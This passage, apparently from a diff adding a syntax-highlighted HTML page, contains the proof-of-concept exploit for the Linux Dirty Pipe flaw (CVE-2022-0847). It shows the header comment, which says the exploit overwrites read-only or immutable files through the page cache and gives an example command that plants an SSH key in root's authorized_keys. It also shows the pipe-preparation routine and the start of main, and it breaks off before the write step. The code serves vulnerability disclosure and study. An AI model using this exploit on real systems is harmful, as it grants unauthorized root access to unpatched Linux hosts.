+&lt;/span&gt;&lt;span class="lnt"&gt; 57
+&lt;/span&gt;&lt;span class="lnt"&gt; 58
+&lt;/span&gt;&lt;span class="lnt"&gt; 59
+&lt;/span&gt;&lt;span class="lnt"&gt; 60
+&lt;/span&gt;&lt;span class="lnt"&gt; 61
+&lt;/span&gt;&lt;span class="lnt"&gt; 62
+&lt;/span&gt;&lt;span class="lnt"&gt; 63
+&lt;/span&gt;&lt;span class="lnt"&gt; 64
+&lt;/span&gt;&lt;span class="lnt"&gt; 65
+&lt;/span&gt;&lt;span class="lnt"&gt; 66
+&lt;/span&gt;&lt;span class="lnt"&gt; 67
+&lt;/span&gt;&lt;span class="lnt"&gt; 68
+&lt;/span&gt;&lt;span class="lnt"&gt; 69
+&lt;/span&gt;&lt;span class="lnt"&gt; 70
+&lt;/span&gt;&lt;span class="lnt"&gt; 71
+&lt;/span&gt;&lt;span class="lnt"&gt; 72
+&lt;/span&gt;&lt;span class="lnt"&gt; 73
+&lt;/span&gt;&lt;span class="lnt"&gt; 74
+&lt;/span&gt;&lt;span class="lnt"&gt; 75
+&lt;/span&gt;&lt;span class="lnt"&gt; 76
+&lt;/span&gt;&lt;span class="lnt"&gt; 77
+&lt;/span&gt;&lt;span class="lnt"&gt; 78
+&lt;/span&gt;&lt;span class="lnt"&gt; 79
+&lt;/span&gt;&lt;span class="lnt"&gt; 80
+&lt;/span&gt;&lt;span class="lnt"&gt; 81
+&lt;/span&gt;&lt;span class="lnt"&gt; 82
+&lt;/span&gt;&lt;span class="lnt"&gt; 83
+&lt;/span&gt;&lt;span class="lnt"&gt; 84
+&lt;/span&gt;&lt;span class="lnt"&gt; 85
+&lt;/span&gt;&lt;span class="lnt"&gt; 86
+&lt;/span&gt;&lt;span class="lnt"&gt; 87
+&lt;/span&gt;&lt;span class="lnt"&gt; 88
+&lt;/span&gt;&lt;span class="lnt"&gt; 89
+&lt;/span&gt;&lt;span class="lnt"&gt; 90
+&lt;/span&gt;&lt;span class="lnt"&gt; 91
+&lt;/span&gt;&lt;span class="lnt"&gt; 92
+&lt;/span&gt;&lt;span class="lnt"&gt; 93
+&lt;/span&gt;&lt;span class="lnt"&gt; 94
+&lt;/span&gt;&lt;span class="lnt"&gt; 95
+&lt;/span&gt;&lt;span class="lnt"&gt; 96
+&lt;/span&gt;&lt;span class="lnt"&gt; 97
+&lt;/span&gt;&lt;span class="lnt"&gt; 98
+&lt;/span&gt;&lt;span class="lnt"&gt; 99
+&lt;/span&gt;&lt;span class="lnt"&gt;100
+&lt;/span&gt;&lt;span class="lnt"&gt;101
+&lt;/span&gt;&lt;span class="lnt"&gt;102
+&lt;/span&gt;&lt;span class="lnt"&gt;103
+&lt;/span&gt;&lt;span class="lnt"&gt;104
+&lt;/span&gt;&lt;span class="lnt"&gt;105
+&lt;/span&gt;&lt;span class="lnt"&gt;106
+&lt;/span&gt;&lt;span class="lnt"&gt;107
+&lt;/span&gt;&lt;span class="lnt"&gt;108
+&lt;/span&gt;&lt;span class="lnt"&gt;109
+&lt;/span&gt;&lt;span class="lnt"&gt;110
+&lt;/span&gt;&lt;span class="lnt"&gt;111
+&lt;/span&gt;&lt;span class="lnt"&gt;112
+&lt;/span&gt;&lt;span class="lnt"&gt;113
+&lt;/span&gt;&lt;span class="lnt"&gt;114
+&lt;/span&gt;&lt;span class="lnt"&gt;115
+&lt;/span&gt;&lt;span class="lnt"&gt;116
+&lt;/span&gt;&lt;span class="lnt"&gt;117
+&lt;/span&gt;&lt;span class="lnt"&gt;118
+&lt;/span&gt;&lt;span class="lnt"&gt;119
+&lt;/span&gt;&lt;span class="lnt"&gt;120
+&lt;/span&gt;&lt;span class="lnt"&gt;121
+&lt;/span&gt;&lt;span class="lnt"&gt;122
+&lt;/span&gt;&lt;span class="lnt"&gt;123
+&lt;/span&gt;&lt;span class="lnt"&gt;124
+&lt;/span&gt;&lt;span class="lnt"&gt;125
+&lt;/span&gt;&lt;span class="lnt"&gt;126
+&lt;/span&gt;&lt;span class="lnt"&gt;127
+&lt;/span&gt;&lt;span class="lnt"&gt;128
+&lt;/span&gt;&lt;span class="lnt"&gt;129
+&lt;/span&gt;&lt;span class="lnt"&gt;130
+&lt;/span&gt;&lt;span class="lnt"&gt;131
+&lt;/span&gt;&lt;span class="lnt"&gt;132
+&lt;/span&gt;&lt;span class="lnt"&gt;133
+&lt;/span&gt;&lt;span class="lnt"&gt;134
+&lt;/span&gt;&lt;span class="lnt"&gt;135
+&lt;/span&gt;&lt;span class="lnt"&gt;136
+&lt;/span&gt;&lt;span class="lnt"&gt;137
+&lt;/span&gt;&lt;span class="lnt"&gt;138
+&lt;/span&gt;&lt;span class="lnt"&gt;139
+&lt;/span&gt;&lt;span class="lnt"&gt;140
+&lt;/span&gt;&lt;span class="lnt"&gt;141
+&lt;/span&gt;&lt;span class="lnt"&gt;142
+&lt;/span&gt;&lt;span class="lnt"&gt;143
+&lt;/span&gt;&lt;span class="lnt"&gt;144
+&lt;/span&gt;&lt;span class="lnt"&gt;145
+&lt;/span&gt;&lt;span class="lnt"&gt;146
+&lt;/span&gt;&lt;span class="lnt"&gt;147
+&lt;/span&gt;&lt;span class="lnt"&gt;148
+&lt;/span&gt;&lt;span class="lnt"&gt;149
+&lt;/span&gt;&lt;span class="lnt"&gt;150
+&lt;/span&gt;&lt;span class="lnt"&gt;151
+&lt;/span&gt;&lt;span class="lnt"&gt;152
+&lt;/span&gt;&lt;span class="lnt"&gt;153
+&lt;/span&gt;&lt;span class="lnt"&gt;154
+&lt;/span&gt;&lt;span class="lnt"&gt;155
+&lt;/span&gt;&lt;span class="lnt"&gt;156
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-c++" data-lang="c++"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="cm"&gt;/* SPDX-License-Identifier: GPL-2.0 */&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="cm"&gt;/*
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="cm"&gt; * Copyright 2022 CM4all GmbH / IONOS SE
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="cm"&gt; *
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="cm"&gt; * author: Max Kellermann &amp;lt;max.kellermann@ionos.com&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="cm"&gt; *
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="cm"&gt; * Proof-of-concept exploit for the Dirty Pipe
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="cm"&gt; * vulnerability (CVE-2022-0847) caused by an uninitialized
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="cm"&gt; * &amp;#34;pipe_buffer.flags&amp;#34; variable. It demonstrates how to overwrite any
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="cm"&gt; * file contents in the page cache, even if the file is not permitted
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="cm"&gt; * to be written, immutable or on a read-only mount.
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="cm"&gt; *
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="cm"&gt; * This exploit requires Linux 5.8 or later; the code path was made
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="cm"&gt; * reachable by commit f6dd975583bd (&amp;#34;pipe: merge
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="cm"&gt; * anon_pipe_buf*_ops&amp;#34;). The commit did not introduce the bug, it was
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="cm"&gt; * there before, it just provided an easy way to exploit it.
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="cm"&gt; *
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="cm"&gt; * There are two major limitations of this exploit: the offset cannot
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="cm"&gt; * be on a page boundary (it needs to write one byte before the offset
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="cm"&gt; * to add a reference to this page to the pipe), and the write cannot
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="cm"&gt; * cross a page boundary.
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="cm"&gt; *
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="cm"&gt; * Example: ./write_anything /root/.ssh/authorized_keys 1 $&amp;#39;\nssh-ed25519 AAA......\n&amp;#39;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="cm"&gt; *
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="cm"&gt; * Further explanation: https://dirtypipe.cm4all.com/
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="cm"&gt; */&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="cp"&gt;#define _GNU_SOURCE
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;fcntl.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;sys/stat.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;sys/user.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="cp"&gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="cp"&gt;#ifndef PAGE_SIZE
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="cp"&gt;#define PAGE_SIZE 4096
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="cp"&gt;#endif
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="cp"&gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="cm"&gt;/**
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="cm"&gt; * Create a pipe where all &amp;#34;bufs&amp;#34; on the pipe_inode_info ring have the
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="cm"&gt; * PIPE_BUF_FLAG_CAN_MERGE flag set.
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="cm"&gt; */&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;static&lt;/span&gt; &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;prepare_pipe&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;pipe&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="n"&gt;abort&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;const&lt;/span&gt; &lt;span class="kt"&gt;unsigned&lt;/span&gt; &lt;span class="n"&gt;pipe_size&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;fcntl&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;F_GETPIPE_SZ&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;static&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;4096&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="cm"&gt;/* fill the pipe completely; each pipe_buffer will now have
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="cm"&gt; the PIPE_BUF_FLAG_CAN_MERGE flag */&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;unsigned&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;pipe_size&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="kt"&gt;unsigned&lt;/span&gt; &lt;span class="n"&gt;n&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;?&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;-=&lt;/span&gt; &lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="cm"&gt;/* drain the pipe, freeing all pipe_buffer instances (but
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="cm"&gt; leaving the flags initialized) */&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;unsigned&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;pipe_size&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="kt"&gt;unsigned&lt;/span&gt; &lt;span class="n"&gt;n&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;?&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;-=&lt;/span&gt; &lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="cm"&gt;/* the pipe is now empty, and if somebody adds a new
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="cm"&gt; pipe_buffer without initializing its &amp;#34;flags&amp;#34;, the buffer
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="cm"&gt; will be mergeable */&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;argc&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;fprintf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;stderr&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;Usage: %s TARGETFILE OFFSET DATA&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;EXIT_FAILURE&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="cm"&gt;/* dumb command-line argument parser */&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;const&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="k"&gt;const&lt;/span&gt; &lt;span class="n"&gt;path&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;loff_t&lt;/span&gt; &lt;span class="n"&gt;offset&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;strtoul&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;const&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="k"&gt;const&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;const&lt;/span&gt; &lt;span class="n"&gt;size_t&lt;/span&gt; &lt;span class="n"&gt;data_size&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;strlen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;offset&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;PAGE_SIZE&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
